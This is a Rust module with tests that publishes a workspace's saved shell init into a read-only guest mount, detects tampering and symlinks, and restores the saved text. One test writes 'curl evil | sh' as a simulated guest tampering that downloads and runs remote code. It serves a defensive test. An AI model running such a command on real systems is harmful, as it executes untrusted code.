// SPDX-License-Identifier: GPL-3.0-or-later
//! A workspace's shell init as the host applies it.
//!
//! The text the user saved lives in the database and nowhere else is the truth. At every start
//! Puddle writes it to a file in a folder of its own for that workspace, mounts the folder
//! read-only in the guest, and has a login shell source the file from a line in a file Puddle owns
//! (see [`loader`]). The guest cannot change the text: the mount is read-only, and the lines that
//! load it are written again by the boot hook at every start.
//!
//! If the mount were ever writable the guest would be writing to the host's disk, so the host
//! never trusts the folder: [`Copies::publish`] compares what it finds with the database, puts
//! the database's text back, removes anything else from the folder and reports that it had to.

use std::collections::BTreeSet;
use std::fs;
use std::io::Write as _;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;

use puddle_compute::{ExecOutput, ExecRequest, FileMount};
use puddle_store::Store;
use puddle_types::{GuestFile, GuestPath, WorkspaceId, WorkspaceName};

/// Where a workspace's folder with its shell init is mounted.
pub(crate) const GUEST_DIR: &str = "/puddle/shell-init";

/// The file in the folder that login shells source.
const FILE_NAME: &str = "init.sh";

/// The file Puddle owns in the guest that loads the shell init.
pub(crate) const LOADER_GUEST: &str = "/etc/profile.d/02-puddle-shell-init.sh";

/// How long the guest may take to run the user's script once (the check on save, and at start).
pub(crate) const CHECK_TIMEOUT: Duration = Duration::from_secs(5);

/// The file that makes a login shell source the shell init. A missing file does nothing, so a
/// workspace whose copy is not there yet starts all the same.
pub(crate) fn loader() -> GuestFile {
    let text = format!(
        "# Loads the shell init that Puddle keeps for this workspace. The copy it loads is read-only\n\
         # here: change it in puddle.\n\
         if [ -r {GUEST_DIR}/{FILE_NAME} ]; then\n    . {GUEST_DIR}/{FILE_NAME}\nfi\n"
    );
    GuestFile::new(guest_path(LOADER_GUEST), text.into_bytes())
}

fn guest_path(path: &str) -> GuestPath {
    // Only called with the constants above, which a test checks.
    GuestPath::new(path).unwrap_or_else(|_| unreachable_path(path))
}

#[cold]
#[expect(
    clippy::panic,
    reason = "invariant: the constants passed to guest_path are valid guest paths (unit-tested)"
)]
fn unreachable_path(path: &str) -> GuestPath {
    panic!("constant guest path {path:?} is not valid")
}

/// What [`Copies::publish`] found.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Published {
    /// The folder held the database's text and nothing else (or nothing yet).
    Clean,
    /// It held something else and Puddle put the database's text back.
    Restored,
}

/// The folders that carry each workspace's shell init to its guest.
pub(crate) struct Copies {
    root: PathBuf,
    store: Arc<Store>,
}

impl Copies {
    /// Folders below `root` (which must be below the guest share), texts from `store`.
    pub(crate) fn new(root: PathBuf, store: Arc<Store>) -> Self {
        Self { root, store }
    }

    fn dir(&self, id: &WorkspaceId) -> PathBuf {
        self.root.join(id.as_str())
    }

    /// The read-only mount that shows `id`'s folder at [`GUEST_DIR`].
    pub(crate) fn mount(&self, id: &WorkspaceId) -> FileMount {
        FileMount::read_only_dir(self.dir(id), guest_path(GUEST_DIR))
    }

    /// Makes `id`'s folder hold exactly the text saved for `name` (an empty file when there is
    /// none) and nothing else.
    ///
    /// # Errors
    /// A message for the user when the database cannot be read or the folder cannot be written.
    pub(crate) fn publish(
        &self,
        id: &WorkspaceId,
        name: &WorkspaceName,
    ) -> Result<Published, String> {
        let wanted = self
            .store
            .shell_init(name)
            .map_err(|e| format!("cannot read {name}'s shell init: {e}"))?
            .map_or_else(String::new, |saved| saved.content.as_str().to_owned());
        publish_in(&self.dir(id), &wanted)
            .map_err(|e| format!("cannot write {name}'s shell init for the workspace: {e}"))
    }

    /// The text saved for `name`, if any.
    ///
    /// # Errors
    /// A message for the user when the database cannot be read.
    pub(crate) fn saved(&self, name: &WorkspaceName) -> Result<Option<String>, String> {
        self.store
            .shell_init(name)
            .map(|saved| saved.map(|s| s.content.as_str().to_owned()))
            .map_err(|e| format!("cannot read {name}'s shell init: {e}"))
    }

    /// Removes `id`'s folder (the workspace is gone). A folder that is not there is fine.
    pub(crate) fn forget(&self, id: &WorkspaceId) {
        let dir = self.dir(id);
        if let Err(e) = fs::remove_dir_all(&dir)
            && e.kind() != std::io::ErrorKind::NotFound
        {
            tracing::warn!(dir = %dir.display(), error = %e, "a deleted workspace's shell init folder was not removed");
        }
    }
}

/// Makes `dir` hold `FILE_NAME` with `wanted` and nothing else. Nothing in it is followed or read
/// through a link: a guest that got write access could plant one.
fn publish_in(dir: &Path, wanted: &str) -> std::io::Result<Published> {
    fs::create_dir_all(dir)?;
    let mut restored = false;
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let is_file = entry.file_type()?.is_file();
        if is_file && entry.file_name() == FILE_NAME {
            // The text is compared below, through the same entry.
            continue;
        }
        restored = true;
        let path = entry.path();
        if entry.file_type()?.is_dir() {
            fs::remove_dir_all(path)?;
        } else {
            fs::remove_file(path)?;
        }
    }
    let target = dir.join(FILE_NAME);
    let held = match fs::symlink_metadata(&target) {
        Ok(meta) if meta.file_type().is_file() => fs::read(&target).ok(),
        _ => None,
    };
    if held.as_deref() == Some(wanted.as_bytes()) {
        return Ok(if restored {
            Published::Restored
        } else {
            Published::Clean
        });
    }
    // A file that is not there yet is a first start, not a change by the guest.
    restored |= fs::symlink_metadata(&target).is_ok();
    // Written beside the target and renamed over it: a link at the target is replaced, never
    // followed, and a reader never sees half a text. `create_new` refuses a name that is taken,
    // links included.
    let partial = dir.join(".init.sh.new");
    let mut file = fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&partial)?;
    file.write_all(wanted.as_bytes())?;
    file.sync_all()?;
    drop(file);
    fs::rename(&partial, &target)?;
    Ok(if restored {
        Published::Restored
    } else {
        Published::Clean
    })
}

/// What running the user's script in a throwaway shell in the guest showed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Verdict {
    /// It parsed and printed nothing.
    Quiet,
    /// It does not parse, or it printed something, or it ran too long; the text says what.
    Refused(String),
}

/// The guest side of the check. The script is on stdin; the exit status says what happened:
/// 0 quiet, 65 syntax error, 66 printed something, 70 could not set up. What it printed is on
/// stdout. Bash when the image has it (people write bash), else `sh`.
const CHECK_SCRIPT: &str = r#"f=$(mktemp) || exit 70
trap 'rm -f "$f"' EXIT
cat >"$f" || exit 70
if command -v bash >/dev/null 2>&1; then s=bash; else s=sh; fi
if ! out=$("$s" -n "$f" 2>&1); then printf '%s' "$out"; exit 65; fi
out=$("$s" -c '. "$1"' "$s" "$f" </dev/null 2>&1; echo x)
if [ "$out" != x ]; then printf '%s' "${out%x}"; exit 66; fi
"#;

/// The request that runs [`CHECK_SCRIPT`] on `content`.
pub(crate) fn check_request(content: &str) -> ExecRequest {
    let mut request = ExecRequest::new("sh", ["-c", CHECK_SCRIPT])
        .as_user("root")
        .with_timeout(CHECK_TIMEOUT);
    request.stdin = content.as_bytes().to_vec();
    request
}

/// The most of a script's output the user is shown.
const SHOWN_BYTES: usize = 2 * 1024;

/// Reads what the check said.
pub(crate) fn verdict(output: &ExecOutput) -> Result<Verdict, String> {
    let said = output.stdout_text();
    let said = said.trim_end();
    let mut shown: String = said.chars().take(SHOWN_BYTES).collect();
    if shown.len() < said.len() {
        shown.push_str(" ...");
    }
    match output.status.code {
        0 => Ok(Verdict::Quiet),
        65 => Ok(Verdict::Refused(format!(
            "the shell init does not parse: {shown}"
        ))),
        66 => Ok(Verdict::Refused(format!(
            "the shell init prints output when a shell starts, which breaks tools that read a \
             shell's output (VS Code Remote-SSH, scp, rsync); remove what prints, or print only \
             when the shell is interactive. It printed: {shown}"
        ))),
        code => Err(format!(
            "the check could not run in the workspace (exit {code}): {}",
            output.stderr_text().trim_end()
        )),
    }
}

/// The text that says the check did not finish in time.
pub(crate) fn timed_out_message() -> String {
    format!(
        "the shell init took more than {} seconds to finish when a shell started it, and every \
         shell the workspace starts waits for it; make it quicker, or move slow work into the \
         background",
        CHECK_TIMEOUT.as_secs()
    )
}

/// The login-shell files a restart found replaced, from the hook's report: only the one that
/// loads the shell init counts.
pub(crate) fn loader_replaced(replaced: &[&str]) -> bool {
    replaced
        .iter()
        .copied()
        .collect::<BTreeSet<_>>()
        .contains(LOADER_GUEST)
}

#[cfg(test)]
mod tests {
    use puddle_store::{Limits, ManualClock, ShellInitText};

    use super::*;

    fn copies(root: &Path) -> (Copies, Arc<Store>) {
        let store = Arc::new(
            Store::open_in_memory(Arc::new(ManualClock::new(1)), Limits::default()).unwrap(),
        );
        (Copies::new(root.to_path_buf(), Arc::clone(&store)), store)
    }

    fn id(text: &str) -> WorkspaceId {
        WorkspaceId::new(text).unwrap()
    }

    fn name(text: &str) -> WorkspaceName {
        WorkspaceName::new(text).unwrap()
    }

    #[test]
    fn the_constants_are_valid_guest_paths_and_the_loader_sources_the_mounted_file() {
        for path in [GUEST_DIR, LOADER_GUEST] {
            assert!(GuestPath::new(path).is_ok(), "{path}");
        }
        assert!(
            GuestPath::new(&format!("{GUEST_DIR}/{FILE_NAME}"))
                .unwrap()
                .is_within(&GuestPath::new(GUEST_DIR).unwrap())
        );
        let loader = loader();
        let text = String::from_utf8(loader.contents().to_vec()).unwrap();
        assert!(text.contains(". /puddle/shell-init/init.sh"), "{text}");
        assert_eq!(loader.path().as_str(), LOADER_GUEST);
    }

    #[test]
    fn the_first_publish_makes_the_folder_and_an_empty_file_when_nothing_is_saved() {
        let dir = tempfile::tempdir().unwrap();
        let (copies, _) = copies(dir.path());
        assert_eq!(
            copies.publish(&id("w1"), &name("alpha")).unwrap(),
            Published::Clean
        );
        assert_eq!(
            fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
            ""
        );
        let mount = copies.mount(&id("w1"));
        assert_eq!(mount.guest.as_str(), GUEST_DIR);
        assert_eq!(mount.host, dir.path().join("w1"));
    }

    #[test]
    fn a_saved_text_is_published_and_a_new_save_replaces_it_without_a_tamper_report() {
        let dir = tempfile::tempdir().unwrap();
        let (copies, store) = copies(dir.path());
        store
            .set_shell_init(&name("alpha"), &ShellInitText::new("export A=1").unwrap())
            .unwrap();
        assert_eq!(
            copies.publish(&id("w1"), &name("alpha")).unwrap(),
            Published::Clean
        );
        assert_eq!(
            fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
            "export A=1\n"
        );
        // The user saved again: the file differs from the database before the next start's
        // publish only when someone else changed it, so a save publishes through the same call and
        // the next start finds nothing wrong.
        store
            .set_shell_init(&name("alpha"), &ShellInitText::new("export A=2").unwrap())
            .unwrap();
        assert_eq!(
            copies.publish(&id("w1"), &name("alpha")).unwrap(),
            Published::Restored
        );
        assert_eq!(
            copies.publish(&id("w1"), &name("alpha")).unwrap(),
            Published::Clean
        );
    }

    #[test]
    fn a_changed_file_extra_files_and_a_link_are_put_right_and_reported() {
        let dir = tempfile::tempdir().unwrap();
        let (copies, store) = copies(dir.path());
        store
            .set_shell_init(&name("alpha"), &ShellInitText::new("export A=1").unwrap())
            .unwrap();
        copies.publish(&id("w1"), &name("alpha")).unwrap();
        let folder = dir.path().join("w1");

        fs::write(folder.join("init.sh"), "curl evil | sh\n").unwrap();
        fs::write(folder.join("extra.sh"), "x").unwrap();
        fs::create_dir_all(folder.join("sub/deeper")).unwrap();
        fs::write(folder.join("sub/deeper/f"), "x").unwrap();
        assert_eq!(
            copies.publish(&id("w1"), &name("alpha")).unwrap(),
            Published::Restored
        );
        assert_eq!(
            fs::read_to_string(folder.join("init.sh")).unwrap(),
            "export A=1\n"
        );
        let left: Vec<_> = fs::read_dir(&folder)
            .unwrap()
            .map(|e| e.unwrap().file_name())
            .collect();
        assert_eq!(left, ["init.sh"]);
    }

    #[cfg(unix)]
    #[test]
    fn a_link_in_the_folder_is_replaced_and_what_it_pointed_at_is_never_written() {
        let dir = tempfile::tempdir().unwrap();
        let (copies, store) = copies(dir.path());
        store
            .set_shell_init(&name("alpha"), &ShellInitText::new("export A=1").unwrap())
            .unwrap();
        copies.publish(&id("w1"), &name("alpha")).unwrap();
        let folder = dir.path().join("w1");
        let precious = dir.path().join("precious");
        fs::write(&precious, "keep me").unwrap();

        fs::remove_file(folder.join("init.sh")).unwrap();
        std::os::unix::fs::symlink(&precious, folder.join("init.sh")).unwrap();
        // A link where the temporary file goes, too.
        std::os::unix::fs::symlink(&precious, folder.join(".init.sh.new")).unwrap();
        assert_eq!(
            copies.publish(&id("w1"), &name("alpha")).unwrap(),
            Published::Restored
        );
        assert_eq!(fs::read_to_string(&precious).unwrap(), "keep me");
        assert!(
            !fs::symlink_metadata(folder.join("init.sh"))
                .unwrap()
                .file_type()
                .is_symlink()
        );
        assert_eq!(
            fs::read_to_string(folder.join("init.sh")).unwrap(),
            "export A=1\n"
        );
    }

    #[test]
    fn forgetting_removes_the_folder_and_a_missing_one_is_fine() {
        let dir = tempfile::tempdir().unwrap();
        let (copies, _) = copies(dir.path());
        copies.publish(&id("w1"), &name("alpha")).unwrap();
        copies.forget(&id("w1"));
        assert!(!dir.path().join("w1").exists());
        copies.forget(&id("w1"));
    }

    #[test]
    fn forgetting_a_folder_that_cannot_be_removed_leaves_it_and_goes_on() {
        let dir = tempfile::tempdir().unwrap();
        let (copies, _) = copies(dir.path());
        // Not a folder, so removing it as one fails with something other than "not found".
        let in_the_way = dir.path().join("w1");
        fs::write(&in_the_way, "x").unwrap();
        copies.forget(&id("w1"));
        assert!(in_the_way.exists());
    }

    #[test]
    fn an_extra_file_beside_the_right_text_is_removed_and_reported() {
        let dir = tempfile::tempdir().unwrap();
        let (copies, store) = copies(dir.path());
        store
            .set_shell_init(&name("alpha"), &ShellInitText::new("export A=1").unwrap())
            .unwrap();
        copies.publish(&id("w1"), &name("alpha")).unwrap();
        let extra = dir.path().join("w1/extra.sh");
        fs::write(&extra, "echo hi").unwrap();
        assert_eq!(
            copies.publish(&id("w1"), &name("alpha")).unwrap(),
            Published::Restored
        );
        assert!(!extra.exists());
        assert_eq!(
            fs::read_to_string(dir.path().join("w1/init.sh")).unwrap(),
            "export A=1\n"
        );
    }

    #[test]
    fn a_folder_that_cannot_be_written_says_which_workspace_and_why() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("in-the-way");
        fs::write(&file, "x").unwrap();
        // The root is a file, so no folder can be made below it.
        let (copies, _) = copies(&file);
        let why = copies.publish(&id("w1"), &name("alpha")).unwrap_err();
        assert!(why.contains("alpha's shell init"), "{why}");
    }

    /// What a verdict says, as text to assert on: a refusal's message is in it.
    fn refusal(said: &Result<Verdict, String>) -> String {
        format!("{said:?}")
    }

    #[test]
    fn the_check_reads_every_exit_the_guest_script_has() {
        let said = |code: i32, out: &str| verdict(&ExecOutput::new(code, out, "err"));
        assert_eq!(said(0, ""), Ok(Verdict::Quiet));
        let syntax = refusal(&said(65, "line 3: unexpected end"));
        assert!(
            syntax.contains("does not parse") && syntax.contains("line 3"),
            "{syntax}"
        );
        let loud = refusal(&said(66, "hello"));
        assert!(
            loud.contains("prints output") && loud.contains("It printed: hello"),
            "{loud}"
        );
        let long = "y".repeat(10_000);
        let cut = refusal(&said(66, &long));
        assert!(cut.len() < 3000 && cut.contains(" ...\""), "{}", cut.len());
        assert!(said(70, "").unwrap_err().contains("could not run"));
        assert!(timed_out_message().contains("5 seconds"));
    }

    #[test]
    fn the_check_request_runs_as_root_with_the_script_on_stdin_and_a_limit() {
        let request = check_request("echo hi\n");
        assert_eq!(request.stdin, b"echo hi\n");
        assert_eq!(request.user.as_deref(), Some("root"));
        assert_eq!(request.timeout, CHECK_TIMEOUT);
    }

    #[test]
    fn only_the_loader_counts_as_a_tampered_login_file() {
        assert!(loader_replaced(&["/etc/npmrc", LOADER_GUEST]));
        assert!(!loader_replaced(&["/etc/npmrc"]));
    }

    /// The guest script against a real shell: what it must catch and must let through.
    #[cfg(unix)]
    #[test]
    fn the_guest_script_catches_a_syntax_error_and_output_and_passes_a_quiet_script() {
        let run = |script: &str| {
            let mut child = std::process::Command::new("sh")
                .args(["-c", CHECK_SCRIPT])
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
                .unwrap();
            child
                .stdin
                .take()
                .unwrap()
                .write_all(script.as_bytes())
                .unwrap();
            let out = child.wait_with_output().unwrap();
            ExecOutput::new(out.status.code().unwrap(), out.stdout, out.stderr)
        };
        let quiet = run("export A=1\nalias ll='ls -l'\nif false; then echo never; fi\n");
        assert_eq!(verdict(&quiet), Ok(Verdict::Quiet), "{quiet:?}");
        assert!(
            matches!(verdict(&run("if then\n")), Ok(Verdict::Refused(m)) if m.contains("does not parse"))
        );
        let loud = run("echo hello\n");
        assert!(
            matches!(verdict(&loud), Ok(Verdict::Refused(m)) if m.contains("It printed: hello"))
        );
        // Output on stderr counts, and so does a bare newline.
        assert!(matches!(
            verdict(&run("echo oops >&2\n")),
            Ok(Verdict::Refused(_))
        ));
        assert!(matches!(verdict(&run("echo\n")), Ok(Verdict::Refused(_))));
    }
}
